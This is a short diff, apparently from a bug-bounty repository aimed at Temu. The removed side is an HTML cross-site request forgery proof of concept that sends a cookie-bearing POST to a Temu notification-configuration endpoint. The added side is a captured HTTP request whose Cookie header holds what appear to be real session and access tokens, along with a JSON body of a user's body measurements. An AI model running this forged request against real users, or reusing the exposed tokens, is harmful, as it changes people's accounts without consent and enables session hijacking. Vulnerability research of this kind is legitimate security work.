@@ -1,25 +1,17 @@
-<!DOCTYPE html>
-<html>
-  <body>
-    <h3>Manual CSRF PoC with JSON Payload</h3>
-    <button onclick="sendCSRF()">Send CSRF POST</button>
+POST /api/bg-barbera-api/user/size/report HTTP/2
+Host: www.temu.com
+Cookie: api_uid=Cm0EFGhe2OGBrwBT4qxbAg==; region=37; language=en; currency=CAD; __cf_bm=fj4aIZXBCkUH0Y.B32IyUPVfKNitsgQ.w9nilVmQ8ro-1751051117-1.0.1.1-WJJk4fFPIMuKo3_SaebcKavvlgRBAbl2URQiUJgcFEsPeimXJ9LY5Lr9gREwIKdejMaxAYkGgzIFNj3tAp3Tfkzl2IWlUvpy9ZfqcFP6D_pds5ZmIfRo6pb1LHgCf4CC; _bee=cNCbJenffIoLufascEhKmVyDZdQvuans; njrpl=cNCbJenffIoLufascEhKmVyDZdQvuans; dilx=CY4gjBVJ6Cz8XSL7zrJAg; hfsc=L3yPeYk07z3+2pbLfg==; timezone=Asia%2FKolkata; webp=1; _nano_fp=XpmyXp9Yn5X8XpTan9_eAdC8P7PzqyW7im9lfU1W; _ttc=3.lzESsQTt5F0O.1782582372; verifyAuthToken=BMUuy1BP_1ZX4wLJKHAoHQ6b54da18f0da1acc5; _hal_tag=ACmfTQ+X3b7zYkh+ZGC8eQ/ZWoUQ2lZE8hFxqsi/GibsssPq7c74fvPCkvJ14RkDUg==; AccessToken=S4MM2KYDLXGSUZ6EV4MG3MGF7YJ7KBUWBJ53GJ5ULKKZMX6QD52Q0110254e1ed5; user_uin=BAOFBLR3OYNO7WUDMNENYL4IJ2CWN5BRUTTCNWUE; isLogin=1751046431550; _u_pa=%7B%22nrpt%22%3A0%7D
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/json;charset=UTF-8
+Content-Length: 124
+Origin: https://www.temu.com
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=0
+Te: trailers
 
-    <script>
-      function sendCSRF() {
-        fetch("https://www.temu.com/api/bg-barbera-api/setting/notification/configure", {
-          method: "POST",
-          credentials: "include", // sends cookies
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            id: 100,
-            status: 1
-          })
-        })
-        .then(response => alert('Request sent. Status: ' + response.status))
-        .catch(error => alert('Error: ' + error));
-      }
-    </script>
-  </body>
-</html>
+{"bust_size":60.152,"size_unit":"IN","waist_size":50.761,"hip_size":60.152,"height":50.508,"weight":25.079,"trp_track":null}
